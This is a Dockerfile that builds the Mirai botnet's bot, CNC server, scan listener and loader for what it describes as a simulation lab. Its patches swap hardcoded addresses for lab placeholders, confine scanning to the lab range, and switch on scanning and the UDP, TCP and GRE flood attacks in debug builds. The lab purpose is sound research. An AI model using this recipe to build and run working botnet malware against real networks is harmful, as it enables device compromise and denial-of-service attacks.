# Development.
#    - Mirai bot
#    - Mirai cnc server
#    - Mirai scan listener server
#    - Mirai loader

FROM ubuntu:focal AS builder

RUN apt update && DEBIAN_FRONTEND=noninteractive apt install -y \
    git \
    build-essential \
    golang-1.21 \
    electric-fence \
    && rm -rf /var/lib/apt/lists/* \
    && update-alternatives --install /usr/local/bin/go go /usr/lib/go-1.21/bin/go 1


WORKDIR /opt
ENV GOPATH /opt/go

RUN git clone https://github.com/jgamblin/Mirai-Source-Code.git

RUN go mod init mirai &&\
    go mod tidy &&\
    go get github.com/go-sql-driver/mysql &&\
    go get github.com/mattn/go-shellwords

# patches
## build
### ignore other architectures
RUN awk 'NR>=52&&NR<=55{$0="#"$0} {print $0}' Mirai-Source-Code/mirai/build.sh > build.sh.tmp && mv build.sh.tmp Mirai-Source-Code/mirai/build.sh
## cnc
### fix sql error
RUN sed --in-place '2c use mirai;' Mirai-Source-Code/scripts/db.sql
### open database using unix sockets instead of tcp
### replace this: db, err := sql.Open("mysql", fmt.Sprintf("%s:%s@tcp(%s)/%s", dbUser, dbPassword, dbAddr, dbName))
###         with: db, err := sql.Open("mysql", fmt.Sprintf("%s:%s@unix(/var/run/mysqld/mysqld.sock)/%s", dbUser, dbPassword, dbName))
RUN sed --in-place 's|"%s:%s@tcp(%s)/%s", dbUser, dbPassword, dbAddr, dbName|"%s:%s@unix(/var/run/mysqld/mysqld.sock)/%s", dbUser, dbPassword, dbName|' Mirai-Source-Code/mirai/cnc/database.go
### include database error checks
RUN sed --in-place '/Mysql DB opened/i if err := db.Ping(); err != nil {fmt.Println("ERROR [from patches in Dockerfile]: database Ping() failed, check connection method. Is mysql using tcp or unix sockets?")}' Mirai-Source-Code/mirai/cnc/database.go
## loader
### replace the hardcoded wget/tftp server address (serves Mirai binaries) with the address in the lab.
RUN sed --in-place 's/100.200.100.100/!PLACEHOLDER-MIRAI_WGET_LOADER_IPADDR!/g' Mirai-Source-Code/loader/src/main.c
## bot
### replace the hardcoded dns server (8.8.8.8) with the DNS address in the lab.
RUN sed --in-place 's/8,8,8,8/!PLACEHOLDER-LAB_DNS_IPADDR!/g' Mirai-Source-Code/mirai/bot/resolv.c
RUN sed --in-place 's/8,8,8,8/!PLACEHOLDER-LAB_DNS_IPADDR!/g' Mirai-Source-Code/mirai/bot/attack_udp.c
RUN sed --in-place 's/8,8,8,8/!PLACEHOLDER-LAB_DNS_IPADDR!/g' Mirai-Source-Code/mirai/bot/util.c
### fix bug: unlock the table TABLE_KILLER_STATUS before retreiving values from it (in killer.c)
RUN sed --in-place '/table_retrieve_val(TABLE_KILLER_STATUS, NULL)/i table_unlock_val(TABLE_KILLER_STATUS);' Mirai-Source-Code/mirai/bot/killer.c
### fix bug: and lock it again (in killer.c)
RUN sed --in-place '/table_retrieve_val(TABLE_KILLER_STATUS, NULL)/a table_lock_val(TABLE_KILLER_STATUS);' Mirai-Source-Code/mirai/bot/killer.c
### remove directives to enable port scanning in debug mode (in main.c)
### 158 #ifndef DEBUG
### 159 #ifdef MIRAI_TELNET
### 160     scanner_init();
### 161 #endif
### 162 #endif
RUN linenum=$(sed -n '/scanner_init/=' Mirai-Source-Code/mirai/bot/main.c) &&\
    sed --in-place "$((linenum - 2)) s/^/\/\//; $((linenum +2)) s/^/\/\//" Mirai-Source-Code/mirai/bot/main.c &&\
    sed --in-place '/scanner_init/i printf("[from patches in Dockerfile] calling scanner_init()");' Mirai-Source-Code/mirai/bot/main.c
### generate random ip addresses (for the port scanning) only in the range of the simulation lab
COPY get_random_ip.patch Mirai-Source-Code/mirai/bot/
RUN patch Mirai-Source-Code/mirai/bot/scanner.c Mirai-Source-Code/mirai/bot/get_random_ip.patch
### enable attacks in debug mode in attack_udp.c
RUN awk 'BEGIN{directive=0} /^#ifdef DEBUG/{directive+=1} /^#endif/{directive-=1} \
/break;/&&directive {$0="//"$0} \
/if \(errno != 0\)/&&directive {$0="//"$0} \
/printf\("errno = %d\\n", errno\);/&&directive {$0="//"$0} \
{print $0}' Mirai-Source-Code/mirai/bot/attack_udp.c > attack_udp.c.tmp && mv attack_udp.c.tmp Mirai-Source-Code/mirai/bot/attack_udp.c

### enable attacks in debug mode in attack_tcp.c
RUN awk 'BEGIN{directive=0} /^#ifdef DEBUG/{directive+=1} /^#endif/{directive-=1} \
/break;/&&directive {$0="//"$0} \
/if \(errno != 0\)/&&directive {$0="//"$0} \
/printf\("errno = %d\\n", errno\);/&&directive {$0="//"$0} \
{print $0}' Mirai-Source-Code/mirai/bot/attack_tcp.c > attack_tcp.c.tmp && mv attack_tcp.c.tmp Mirai-Source-Code/mirai/bot/attack_tcp.c

### enable attacks in debug mode in attack_gre.c
RUN awk 'BEGIN{directive=0} /^#ifdef DEBUG/{directive+=1} /^#endif/{directive-=1} \
/break;/&&directive {$0="//"$0} \
/if \(errno != 0\)/&&directive {$0="//"$0} \
/printf\("errno = %d\\n", errno\);/&&directive {$0="//"$0} \
{print $0}' Mirai-Source-Code/mirai/bot/attack_gre.c > attack_gre.c.tmp && mv attack_gre.c.tmp Mirai-Source-Code/mirai/bot/attack_gre.c


# compile bot, cnc, scan listener
RUN cd Mirai-Source-Code/mirai &&\
    rm -rf debug &&\
    mkdir debug &&\
    chmod +x build.sh &&\
    ./build.sh debug telnet &&\
    # 'prompt.txt' file must be in the same directory as the compiled cnc binary (if not, the cnc will not accept telnet connections)
    cp prompt.txt debug/prompt.txt

# compile loader
RUN cd Mirai-Source-Code/loader &&\
    chmod +x build.debug.sh &&\
    ./build.debug.sh


CMD ["/bin/bash"]
